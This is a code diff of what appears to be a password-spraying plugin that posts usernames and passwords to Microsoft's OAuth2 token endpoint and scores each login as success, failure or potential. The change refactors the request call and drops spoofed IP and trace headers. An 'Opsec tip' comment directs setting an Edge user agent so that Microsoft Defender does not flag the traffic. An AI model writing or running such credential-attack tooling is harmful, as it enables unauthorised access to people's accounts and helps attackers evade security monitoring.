@@ -1,6 +1,5 @@
-import requests, random
+import random
 import utils.utils as utils
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
 def extract_error(desc):
@@ -8,7 +7,7 @@ def extract_error(desc):
     return desc.split(":")[0].strip()
 
 
-def msgraph_authenticate(url, username, password,  useragent, pluginargs):
+def msgraph_authenticate(api, username, password,  useragent, pluginargs):
 
     data_response = {
         'result' : None,    # Can be "success", "failure" or "potential"
@@ -38,18 +37,9 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
         'scope' : 'openid',
     }
 
-
-    spoofed_ip = utils.generate_ip()
-    amazon_id = utils.generate_id()
-    trace_id = utils.generate_trace_id()
-
     headers = {
-        "X-My-X-Forwarded-For" : spoofed_ip,
-        "x-amzn-apigateway-api-id" : amazon_id,
-        "X-My-X-Amzn-Trace-Id" : trace_id,
         # Opsec tip: UA must be edge otherwise Defender for cloud will flag it!
         "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50",
-
         'Accept': 'application/json',
         'Content-Type': 'application/x-www-form-urlencoded'
     }
@@ -57,7 +47,7 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
     headers = utils.add_custom_headers(pluginargs, headers)
 
     try:
-        resp = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
+        resp = api.post("/common/oauth2/token", headers=headers, data=body)
 
         if resp.status_code == 200:
             data_response['result'] = "success"
